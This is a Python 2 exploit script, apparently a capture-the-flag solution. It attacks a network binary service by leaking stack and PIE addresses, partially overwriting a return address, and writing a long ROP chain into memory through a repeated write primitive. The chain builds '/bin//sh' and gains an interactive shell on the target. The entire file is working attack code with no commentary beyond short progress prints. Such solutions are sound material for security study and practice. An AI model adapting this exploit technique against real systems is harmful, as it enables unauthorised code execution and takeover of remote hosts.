#!/usr/bin/env python2

import sys, socket, telnetlib
from struct import *

def recvuntil(t):
    data = ''
    while not data.endswith(t):
        tmp = s.recv(1)
        if not tmp: break
        data += tmp

    return data

def interactive():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p32(x): return pack('<I', x)
def u32(x): return unpack('<I', x)[0]
def p64(x): return pack('<Q', x)
def u64(x): return unpack('<Q', x)[0]

def write_data_at(choice, data, address, final = False):
    print "[+] Writing data={} at address={}".format(data, address)
    s.send('{}\n'.format(choice))
    leak = int(recvuntil('\n'), 16)
    s.send('{}'.format(address))
    recvuntil('data : ')
    s.send(data)
    if not final:
        recvuntil(' > ')
        return leak

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))

# Leak stack address
recvuntil(' > ')
s.send('1\n')
leak_stack = int(recvuntil('\n'), 16)
print "[+] Stack leak = {}".format(hex(leak_stack))
recvuntil('address : ')
s.send('{}'.format(leak_stack +  0x28 - 0x6))
recvuntil('data : ')
# partial overwrite of the ret address. Bruteforce a nibble
s.send('\x11' * 6 + '\xb8\x2a')
recvuntil(' > ')

# In the main function again hopefully. Let's leak the binary address
s.send('2\n')
pie = int(recvuntil('\n'), 16)
base = pie - 0x8a15
print "[+] Pie leak at = {}".format(hex(pie))
s.send('{}'.format(leak_stack + 0x30))
recvuntil('data : ')
main_address = base + 0x8ab8
s.send(p64(main_address))
recvuntil(' > ')

# Do it twice to reach a gadget already existing in the memory to jump in the main again
for i in range(1,3):    
    write_data_at(2, p64(main_address), leak_stack +  0x30 + 0x8*i)

# Gadget pop rsp; ret
print "[+] Put gadget pop rsp; ret at leak_stack + 0x50"
write_data_at(2, p64(0x000000000000946a + base), leak_stack +  0x30 + 0x8*(i + 2))

# put in the stack the address of the existing gadget
print "[+] Put the address leak_stack + 0x48; ret at leak_stack + 0x58"
write_data_at(2, p64(leak_stack + 0x30 + 0x8*(i + 1)), leak_stack +  0x30 + 0x8*(i + 3))

print "[++] I'm LOOOOOOPING EVERY DAY"

chain = [p64(base +  0x000000000000d9f2), 
p64(base +  0x00000000002b1120),
p64(base +  0x00000000000460ac),
'/bin//sh',
p64(base +  0x0000000000077901),
p64(base +  0x000000000000d9f2),
p64(base +  0x00000000002b1128),
p64(base +  0x0000000000041360),
p64(base +  0x0000000000077901),
p64(base +  0x00000000000084fa),
p64(base +  0x00000000002b1120),
p64(base +  0x000000000000d9f2),
p64(base +  0x00000000002b1128),
p64(base +  0x00000000000484c5),
p64(base +  0x00000000002b1128),
p64(base +  0x0000000000041360),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006d940),
p64(base +  0x000000000006e605)]

# INFINITE LOOP
idx = leak_stack +  0x30 + 0x8 *(i + 4)
print "[+] Writing chain in the memory from leak_stack + 0x60"
while chain:
    print idx
    gadgetaddr = chain.pop(0)
    write_data_at(2, gadgetaddr, idx)
    idx += 0x8

print "[+] exit the infinite loop and jump in the sh ropchain"
write_data_at(2, p64(base + 0x00000000000084fa), leak_stack + 0x30 + 0x8*(i + 2), True)

print "[+] INTERACTIVE Baby"
interactive()
s.close()


